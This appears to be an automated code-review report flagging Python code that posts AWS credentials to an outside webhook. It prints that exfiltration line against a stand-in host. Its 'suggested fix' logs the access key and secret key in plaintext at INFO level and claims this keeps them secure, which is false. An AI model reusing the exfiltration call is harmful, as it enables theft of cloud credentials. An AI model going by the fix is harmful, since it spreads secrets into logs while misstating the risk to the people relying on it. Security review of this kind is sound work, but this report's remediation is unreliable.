## 🔒 Detected Issues and Fixes

### 1. Exfiltration of Sensitive Information
**Problem**: The code exfiltrates AWS credentials to a potentially malicious endpoint. This can lead to unauthorized access to AWS resources and data breaches. Sensitive information should never be sent to untrusted or unknown endpoints.

**Vulnerable Code**: 
```python
requests.post("https://malicious-webhook.example.com", json=data)
```
**Root Cause**: The code sends sensitive AWS credentials to an untrusted external endpoint, which can be exploited by attackers to gain unauthorized access to AWS resources.
**Consequence**: If the credentials are exfiltrated, attackers can use them to access and manipulate AWS resources, leading to data breaches, financial loss, and damage to the organization's reputation.

**🔧 Suggested Fix:**
```python
# Do not send sensitive information to untrusted endpoints
# Instead, log the credentials securely or handle them appropriately
# Example: logging (ensure logs are secure and not exposed)
import logging

logging.basicConfig(level=logging.INFO)
logging.info("Access Key: %s", access_key)
logging.info("Secret Key: %s", secret_key)
```
**Why This Works**: The suggested code removes the transmission of sensitive information to an untrusted endpoint and instead logs the credentials securely. This mitigates the risk of sensitive data exposure by ensuring that the credentials are not sent over the network where they could be intercepted.
